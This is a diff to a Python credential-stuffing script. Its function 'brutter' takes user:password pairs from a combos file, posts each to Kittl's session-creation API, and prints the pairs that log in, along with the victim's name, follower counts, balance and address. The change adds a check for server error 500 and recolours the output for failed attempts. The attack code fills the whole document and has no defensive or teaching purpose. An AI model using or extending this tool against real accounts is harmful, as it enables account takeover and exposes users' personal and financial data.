@@ -23,7 +23,6 @@ def brutter(user, password):
 
     url = "https://api.kittl.com/sessions/create"
     response = requests.post(url, json=data, headers=headers)
-
     if response.status_code == 201:
         content_type = response.headers.get("Content-Type", "")
         if "application/json" in content_type:
@@ -33,6 +32,7 @@ def brutter(user, password):
             return
 
         data = json.dumps(data)
+
         name = parse_using_re(data, "name")
         followers = parse_using_re(data, "followerCount")
         following = parse_using_re(data, "followingCount")
@@ -44,8 +44,12 @@ def brutter(user, password):
         
         #print(f"{user}:{password} | Name:{name},Followers:{followers},Following:{following},Balance:{balance},Designs:{designCount},CreatedAt:{createdAt},Address:{address} |")
         print(f"{Color.green_bold}{user}:{password}{Color.no_colored}")
+    elif response.status_code == 500:
+        print(f"{Color.red_bold}Response [500] , SERVER DOWN .{Color.no_colored}")
+        exit()
+
     else:
-        print(f"{Color.red_bold}{user}:{password}{Color.no_colored}")
+        print(f"{Color.blue_bold}{user}:{password}{Color.no_colored}")
 
 with open("combos.txt", 'r', encoding='utf-8') as combo:
     lines = combo.readlines()
